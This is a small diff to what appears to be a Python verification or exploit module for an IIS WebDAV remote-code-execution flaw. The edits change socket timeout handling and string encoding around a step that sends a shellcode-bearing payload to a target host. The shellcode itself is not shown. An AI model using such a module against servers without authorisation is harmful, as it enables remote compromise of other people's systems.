@@ -11,7 +11,6 @@ import warnings
 import socket
 from termcolor import cprint
 from urllib.parse import urlparse
-socket.setdefaulttimeout(10)
 
 class iis_webdav_rce_BaseVerify:
     def __init__(self, url):
@@ -35,10 +34,11 @@ class iis_webdav_rce_BaseVerify:
             pay+=shellcode
             pay+='>\r\n\r\n'
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(6.0)
             sock.connect((host,port))
-            sock.send(pay.encode())
+            sock.send(pay.encode("utf-8"))
             try :
-                data = sock.recv(80960).decode()
+                data = sock.recv(80960).decode("utf-8")
                 print(data)
             except :
                 pass
